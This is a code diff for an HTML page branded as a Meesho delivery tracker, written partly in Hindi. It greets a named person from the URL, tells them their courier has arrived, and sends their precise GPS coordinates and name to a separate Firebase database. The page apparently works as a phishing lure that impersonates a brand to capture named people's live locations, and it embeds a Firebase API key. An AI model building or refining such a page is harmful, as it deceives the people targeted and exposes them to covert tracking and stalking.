@@ -3,51 +3,82 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meesho Delivery - Confirm Location</title>
+    <title>Meesho Delivery - Track Your Order</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        #customer-map { height: 250px; width: 100%; border-radius: 12px; margin-top: 15px; display: none; }
-        .driver-live-icon { background: #2563eb; border: 2px solid white; border-radius: 50%; box-shadow: 0 0 8px #2563eb; }
-        .user-live-icon { background: #10b981; border: 2px solid white; border-radius: 50%; }
+        #customer-map { height: 280px; width: 100%; border-radius: 16px; margin-top: 15px; display: none; }
+        .driver-live-icon { background: #2563eb; border: 2px solid white; border-radius: 50%; box-shadow: 0 0 10px #2563eb; }
+        .user-live-icon { background: #ec4899; border: 2px solid white; border-radius: 50%; box-shadow: 0 0 10px #ec4899; }
+        
+        /* स्मूथ स्पिनर के लिए कस्टम CSS */
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid #fff;
+            width: 20px;
+            height: 20px;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
     </style>
 </head>
 <body class="bg-slate-900 text-slate-100 flex flex-col items-center justify-center min-h-screen p-4">
 
-    <div class="bg-slate-800 border border-slate-700 rounded-2xl p-5 w-full max-w-md shadow-2xl text-center">
-        <div class="text-pink-500 text-5xl mb-3">
+    <div class="bg-slate-800 border border-slate-700 rounded-3xl p-6 w-full max-w-md shadow-2xl text-center transition-all duration-300">
+        
+        <!-- टॉप आइकॉन सेक्शन -->
+        <div id="icon-header" class="text-pink-500 text-5xl mb-3 transition-all duration-300">
             <i class="fa-solid fa-bag-shopping"></i>
         </div>
-        <!-- यहाँ कस्टमर का असली नाम शो होगा -->
+        
+        <!-- कस्टमर का नाम -->
         <h2 class="text-xl font-bold mb-1 text-pink-400" id="welcome-text">Meesho Delivery</h2>
-        <p class="text-xs text-slate-400 mb-4">
+        <p id="instruction-text" class="text-xs text-slate-400 mb-5 leading-relaxed">
             नमस्ते! आपका मीशो डिलीवरी पार्टनर आपके एरिया में पहुँच चुका है। आपके पार्सल को सही पते पर सुरक्षित पहुँचाने के लिए कृपया नीचे बटन पर क्लिक करके अपनी लोकेशन कन्फर्म करें।
         </p>
 
-        <button id="share-btn" class="w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold py-3 px-4 rounded-xl transition duration-200 flex items-center justify-center gap-2 shadow-md">
-            <i class="fa-solid fa-location-crosshairs"></i> Confirm & Share Location
+        <!-- अपग्रेडेड इंटरएक्टिव बटन -->
+        <button id="share-btn" class="w-full bg-pink-600 hover:bg-pink-700 text-white font-semibold py-3 px-4 rounded-xl transition-all duration-200 flex items-center justify-center gap-2 shadow-lg">
+            <i class="fa-solid fa-location-crosshairs"></i> <span>Confirm & Share Location</span>
         </button>
 
-        <p id="status-msg" class="mt-3 text-xs font-medium text-amber-400"></p>
-
-        <!-- लाइव ट्रैकिंग डिस्प्ले कार्ड -->
-        <div id="tracking-info" class="mt-4 p-3 bg-slate-900 rounded-xl border border-slate-700 text-left hidden">
-            <div class="flex justify-between items-center text-sm mb-1">
-                <span class="text-slate-400"><i class="fa-solid fa-truck text-pink-400"></i> Delivery Boy:</span>
-                <span id="driver-status" class="font-bold text-green-400">On the way</span>
-            </div>
-            <div class="text-xs text-slate-400">आपसे दूरी: <span id="distance-display" class="text-white font-bold">Calculating...</span></div>
+        <!-- स्टेटस और लोडिंग मैसेज -->
+        <div id="status-container" class="mt-3 flex items-center justify-center gap-2 text-xs font-medium text-amber-400 hidden">
+            <div id="status-spinner" class="spinner hidden"></div>
+            <span id="status-msg">GPS सिग्नल से कनेक्ट हो रहा है...</span>
         </div>
 
-        <div id="customer-map"></div>
+        <!-- लाइव ट्रैकिंग डिस्प्ले कार्ड (सक्सेस के बाद दिखेगा) -->
+        <div id="tracking-info" class="mt-4 p-4 bg-slate-900 rounded-2xl border border-slate-700 text-left hidden shadow-inner">
+            <div class="flex justify-between items-center text-sm mb-2">
+                <span class="text-slate-400 flex items-center gap-1">
+                    <i class="fa-solid fa-motorcycle text-sky-400 animate-pulse"></i> Delivery Boy Status:
+                </span>
+                <span id="driver-status" class="font-bold text-green-400 flex items-center gap-1">
+                    🟢 Live Tracking Active
+                </span>
+            </div>
+            <div class="text-xs text-slate-300 bg-slate-800 p-2 rounded-lg border border-slate-700">
+                आपसे दूरी: <span id="distance-display" class="text-pink-400 font-bold">Calculating...</span>
+            </div>
+        </div>
+
+        <!-- नक्शा -->
+        <div id="customer-map" class="shadow-md border border-slate-700"></div>
     </div>
 
+    <!-- Leaflet & Firebase SDKs -->
     <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
 
     <script>
+        // आपका सेम फ़ायरबेस क्रेडेंशियल्स
         const firebaseConfig = {
             apiKey: "AIzaSyAb7V8Xxg5rUYi8UKChEd3rR5dglJ6bLhU",
             authDomain: "t2-storage-4e5ca.firebaseapp.com",
@@ -58,15 +89,13 @@
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // URL से पैरामीटर निकालना (e.g., ?customer=Ramesh_Kumar)
+        // URL से नाम निकालना (?customer=Ramesh_Kumar)
         const urlParams = new URLSearchParams(window.location.search);
         const rawCustomerName = urlParams.get('customer');
         
-        // अगर URL में नाम नहीं है तो एक रैंडम ID जनरेट होगी, नहीं तो नाम के अंडरस्कोर/स्पेस ठीक होंगे
         const customerDisplayName = rawCustomerName ? decodeURIComponent(rawCustomerName).replace(/_/g, ' ') : "Valued Customer";
-        const databaseKey = rawCustomerName ? rawCustomerName.replace(/[^a-zA-Z0-0_]/g, "") : "User_" + Math.floor(Math.random() * 900 + 100);
+        const databaseKey = rawCustomerName ? rawCustomerName.replace(/[^a-zA-Z0-9_]/g, "") : "User_" + Math.floor(Math.random() * 900 + 100);
         
-        // स्क्रीन पर नाम सेट करना
         document.getElementById('welcome-text').innerText = "Hello, " + customerDisplayName;
 
         let map = null;
@@ -74,56 +103,97 @@
         let driverMarker = null;
         let customerCoords = null;
 
-        document.getElementById('share-btn').addEventListener('click', () => {
-            const statusMsg = document.getElementById('status-msg');
+        const shareBtn = document.getElementById('share-btn');
+        const statusContainer = document.getElementById('status-container');
+        const statusSpinner = document.getElementById('status-spinner');
+        const statusMsg = document.getElementById('status-msg');
+        const iconHeader = document.getElementById('icon-header');
+        const instructionText = document.getElementById('instruction-text');
 
+        shareBtn.addEventListener('click', () => {
             if (!navigator.geolocation) {
+                statusContainer.classList.remove('hidden');
                 statusMsg.innerText = "आपका ब्राउज़र GPS सपोर्ट नहीं करता।";
+                statusMsg.className = "text-red-400";
                 return;
             }
 
-            statusMsg.innerText = "GPS सिग्नल से कनेक्ट हो रहा है...";
+            // 1. UI को लोडिंग स्टेट में सेट करना
+            shareBtn.disabled = true;
+            shareBtn.classList.add('opacity-60', 'cursor-not-allowed');
+            shareBtn.querySelector('span').innerText = "Fetching GPS Location...";
+            
+            statusContainer.classList.remove('hidden');
+            statusSpinner.classList.remove('hidden');
+            statusMsg.innerText = "सटीक लोकेशन ट्रैक की जा रही है, कृपया प्रतीक्षा करें...";
+            statusMsg.className = "text-amber-400";
 
+            // 2. करंट लोकेशन फैच करना
             navigator.geolocation.getCurrentPosition(
                 (position) => {
                     const { latitude, longitude } = position.coords;
                     customerCoords = [latitude, longitude];
 
-                    // Firebase में नाम और लोकेशन दोनों भेजना
+                    statusMsg.innerText = "लोकेशन मिल गई! सर्वर पर सुरक्षित सिंक किया जा रहा है...";
+
+                    // 3. Firebase में डेटा सेंड करना
                     database.ref('active_deliveries/' + databaseKey).set({
-                        customerName: customerDisplayName, // डैशबोर्ड पर दिखने वाला साफ़ नाम
+                        customerName: customerDisplayName,
                         lat: latitude,
                         lng: longitude,
                         time: new Date().toLocaleTimeString()
                     }).then(() => {
-                        statusMsg.innerText = "✔ लोकेशन सफलतापूर्वक कन्फर्म हो गई! नीचे लाइव ट्रैकिंग देखें।";
-                        statusMsg.className = "mt-3 text-xs font-medium text-green-400";
-                        document.getElementById('share-btn').style.display = 'none';
+                        // 4. सक्सेसफुल होने पर शानदार फीडबैक एनिमेशन
+                        statusSpinner.classList.add('hidden');
+                        statusMsg.innerHTML = `<i class="fa-solid fa-circle-check text-green-400 text-sm"></i> लोकेशन सफलतापुर्वक कन्फर्म हो गई!`;
+                        statusMsg.className = "text-green-400 text-sm font-semibold";
                         
+                        iconHeader.innerHTML = `<i class="fa-solid fa-map-location-dot"></i>`;
+                        iconHeader.className = "text-green-400 text-5xl mb-3 animate-bounce";
+                        
+                        // बटन और पुराने टेक्स्ट को स्मूथली छुपाना
+                        shareBtn.classList.add('hidden');
+                        instructionText.classList.add('hidden');
+
+                        // मैप लोड करना और डिलीवरी बॉय को लाइव ट्रैक करना
                         initCustomerMap(latitude, longitude);
                         startTrackingDriver();
-                    }).catch(() => {
-                        statusMsg.innerText = "डेटा सेव नहीं हो सका। कृपया दोबारा कोशिश करें।";
+                    }).catch((error) => {
+                        // एरर हैंडलिंग
+                        shareBtn.disabled = false;
+                        shareBtn.classList.remove('opacity-60', 'cursor-not-allowed');
+                        shareBtn.querySelector('span').innerText = "Confirm & Share Location";
+                        statusSpinner.classList.add('hidden');
+                        statusMsg.innerText = "सर्वर एरर: डेटा सेव नहीं हो सका। कृपया फिर कोशिश करें।";
+                        statusMsg.className = "text-red-400";
                     });
                 },
                 (error) => {
-                    statusMsg.innerText = "कृपया सेटिंग में जाकर लोकेशन 'Allow' करें।";
+                    // परमिशन डिनाइड एरर हैंडलिंग
+                    shareBtn.disabled = false;
+                    shareBtn.classList.remove('opacity-60', 'cursor-not-allowed');
+                    shareBtn.querySelector('span').innerText = "Confirm & Share Location";
+                    statusSpinner.classList.add('hidden');
+                    statusMsg.innerText = "कृपया सेटिंग में जाकर लोकेशन परमिशन को 'Allow' करें।";
+                    statusMsg.className = "text-red-400 font-semibold";
                 },
-                { enableHighAccuracy: true }
+                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
         });
 
+        // मैप इनिशियलाइज़ेशन फंक्शन
         function initCustomerMap(lat, lng) {
             document.getElementById('customer-map').style.display = 'block';
             document.getElementById('tracking-info').style.display = 'block';
             
-            map = L.map('customer-map', { zoomControl: false }).setView([lat, lng], 14);
+            map = L.map('customer-map', { zoomControl: false }).setView([lat, lng], 15);
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 
-            const cIcon = L.divIcon({ className: 'user-live-icon', iconSize: [12, 12] });
+            const cIcon = L.divIcon({ className: 'user-live-icon', iconSize: [14, 14] });
             customerMarker = L.marker([lat, lng], { icon: cIcon }).addTo(map).bindPopup("Your Delivery Location").openPopup();
         }
 
+        // डिलीवरी बॉय की लाइव पोजीशन सिंक करना और दूरी दिखाना
         function startTrackingDriver() {
             database.ref('driver_location').on('value', (snapshot) => {
                 const driverData = snapshot.val();
@@ -131,19 +201,29 @@
 
                 const dCoords = [driverData.lat, driverData.lng];
 
+                // ड्राइवर मार्कर क्रिएट या अपडेट करना
                 if (!driverMarker) {
-                    const dIcon = L.divIcon({ className: 'driver-live-icon', iconSize: [14, 14] });
-                    driverMarker = L.marker(dCoords, { icon: dIcon }).addTo(map).bindPopup("Meesho Delivery Partner").openPopup();
+                    const dIcon = L.divIcon({ className: 'driver-live-icon', iconSize: [16, 16] });
+                    driverMarker = L.marker(dCoords, { icon: dIcon }).addTo(map).bindPopup("Delivery Partner").openPopup();
                 } else {
                     driverMarker.setLatLng(dCoords);
                 }
 
+                // दोनों के बीच दूरी की गणना
                 const from = L.latLng(customerCoords);
                 const to = L.latLng(dCoords);
-                const distanceKM = (from.distanceTo(to) / 1000).toFixed(2);
+                const distanceMeters = from.distanceTo(to);
+                
+                let distanceStr = "";
+                if (distanceMeters >= 1000) {
+                    distanceStr = (distanceMeters / 1000).toFixed(2) + " KM";
+                } else {
+                    distanceStr = Math.round(distanceMeters) + " मीटर";
+                }
 
-                document.getElementById('distance-display').innerText = distanceKM + " KM दूर हैं";
+                document.getElementById('distance-display').innerText = distanceStr + " (लाइव लोकेशन)";
 
+                // मैप को ऑटो-ज़ूम करना ताकि दोनों एक स्क्रीन पर सही दिखें
                 const group = new L.featureGroup([customerMarker, driverMarker]);
                 map.fitBounds(group.pad(0.3));
             });
